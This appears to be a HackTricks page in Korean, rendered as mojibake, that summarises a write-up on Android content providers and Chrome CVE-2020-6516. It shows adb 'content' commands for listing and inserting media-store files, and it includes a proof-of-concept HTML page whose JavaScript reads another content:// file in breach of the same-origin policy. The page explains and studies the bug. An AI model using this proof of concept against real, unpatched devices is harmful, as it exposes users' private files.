{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**ì´ê²ƒì€ [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/) ê²Œì‹œë¬¼ì˜ ìš”ì•½ì…ë‹ˆë‹¤.**

### ë¯¸ë””ì–´ ìŠ¤í† ì–´ì˜ íŒŒì¼ ë‚˜ì—´í•˜ê¸°
ë¯¸ë””ì–´ ìŠ¤í† ì–´ì—ì„œ ê´€ë¦¬ë˜ëŠ” íŒŒì¼ì„ ë‚˜ì—´í•˜ë ¤ë©´ ì•„ë˜ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
$ content query --uri content://media/external/file
```
ê° ì¸ë±ìŠ¤ëœ íŒŒì¼ì˜ ì‹ë³„ìì™€ ê²½ë¡œë§Œ í‘œì‹œí•˜ì—¬ ë³´ë‹¤ ì¸ê°„ ì¹œí™”ì ì¸ ì¶œë ¥ì„ ìœ„í•´:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
ì½˜í…ì¸  ì œê³µìëŠ” ìì‹ ì˜ ê°œì¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ê²©ë¦¬ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì œê³µìì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ëŠ” íŠ¹ì • `content://` URIë¥¼ ìš”êµ¬í•©ë‹ˆë‹¤. ì œê³µìì— ì ‘ê·¼í•˜ê¸° ìœ„í•œ ê²½ë¡œì— ëŒ€í•œ ì •ë³´ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ ë§¤ë‹ˆí˜ìŠ¤íŠ¸ ë˜ëŠ” Android í”„ë ˆì„ì›Œí¬ì˜ ì†ŒìŠ¤ ì½”ë“œì—ì„œ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Chromeì˜ ì½˜í…ì¸  ì œê³µì ì ‘ê·¼
Androidì˜ Chromeì€ `content://` ìŠ¤í‚´ì„ í†µí•´ ì½˜í…ì¸  ì œê³µìì— ì ‘ê·¼í•  ìˆ˜ ìˆì–´, íƒ€ì‚¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë‚´ë³´ë‚¸ ì‚¬ì§„ì´ë‚˜ ë¬¸ì„œì™€ ê°™ì€ ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì„¤ëª…í•˜ê¸° ìœ„í•´, íŒŒì¼ì„ ë¯¸ë””ì–´ ìŠ¤í† ì–´ì— ì‚½ì…í•œ ë‹¤ìŒ Chromeì„ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

ë¯¸ë””ì–´ ìŠ¤í† ì–´ì— ì‚¬ìš©ì ì •ì˜ í•­ëª© ì‚½ì…:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
ìƒˆë¡œ ì‚½ì…ëœ íŒŒì¼ì˜ ì‹ë³„ìë¥¼ ë°œê²¬í•˜ì‹­ì‹œì˜¤:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
íŒŒì¼ì€ íŒŒì¼ì˜ ì‹ë³„ìë¡œ êµ¬ì„±ëœ URLì„ ì‚¬ìš©í•˜ì—¬ Chromeì—ì„œ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, íŠ¹ì • ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ê´€ë ¨ëœ íŒŒì¼ì„ ë‚˜ì—´í•˜ë ¤ë©´:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Same-Origin-Policy Bypass

_ë™ì¼ ì¶œì²˜ ì •ì±…_ (SOP)ì€ ë¸Œë¼ìš°ì €ì—ì„œ ì„œë¡œ ë‹¤ë¥¸ ì¶œì²˜ì˜ ë¦¬ì†ŒìŠ¤ì™€ ìƒí˜¸ì‘ìš©í•˜ëŠ” ê²ƒì„ ì œí•œí•˜ëŠ” ë³´ì•ˆ í”„ë¡œí† ì½œë¡œ, Cross-Origin-Resource-Sharing (CORS) ì •ì±…ì— ì˜í•´ ëª…ì‹œì ìœ¼ë¡œ í—ˆìš©ë˜ì§€ ì•ŠëŠ” í•œ í—ˆìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ ì •ì±…ì€ ì •ë³´ ìœ ì¶œ ë° êµì°¨ ì‚¬ì´íŠ¸ ìš”ì²­ ìœ„ì¡°ë¥¼ ë°©ì§€í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•©ë‹ˆë‹¤. Chromeì€ `content://`ë¥¼ ë¡œì»¬ ìŠ¤í‚´ìœ¼ë¡œ ê°„ì£¼í•˜ì—¬, ê° ë¡œì»¬ ìŠ¤í‚´ URLì´ ë³„ë„ì˜ ì¶œì²˜ë¡œ ì·¨ê¸‰ë˜ëŠ” ë” ì—„ê²©í•œ SOP ê·œì¹™ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ CVE-2020-6516ì€ `content://` URLì„ í†µí•´ ë¡œë“œëœ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ SOP ê·œì¹™ì„ ìš°íšŒí•  ìˆ˜ ìˆëŠ” Chromeì˜ ì·¨ì•½ì ì´ì—ˆìŠµë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ, `content://` URLì˜ JavaScript ì½”ë“œëŠ” ë‹¤ë¥¸ `content://` URLì„ í†µí•´ ë¡œë“œëœ ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆì—ˆìœ¼ë©°, ì´ëŠ” íŠ¹íˆ Android 10 ì´ì „ ë²„ì „ì—ì„œ êµ¬í˜„ë˜ì§€ ì•Šì€ ë²”ìœ„ ì €ì¥ì†Œë¥¼ ì‹¤í–‰í•˜ëŠ” Android ì¥ì¹˜ì—ì„œ ì¤‘ìš”í•œ ë³´ì•ˆ ë¬¸ì œì˜€ìŠµë‹ˆë‹¤.

ì•„ë˜ì˜ ê°œë… ì¦ëª…ì€ ì´ ì·¨ì•½ì ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. HTML ë¬¸ì„œê°€ **/sdcard**ì— ì—…ë¡œë“œë˜ê³  ë¯¸ë””ì–´ ì €ì¥ì†Œì— ì¶”ê°€ëœ í›„, JavaScriptì—ì„œ `XMLHttpRequest`ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¯¸ë””ì–´ ì €ì¥ì†Œì˜ ë‹¤ë¥¸ íŒŒì¼ ë‚´ìš©ì„ ì ‘ê·¼í•˜ê³  í‘œì‹œí•˜ì—¬ SOP ê·œì¹™ì„ ìš°íšŒí•©ë‹ˆë‹¤.

Proof-of-Concept HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
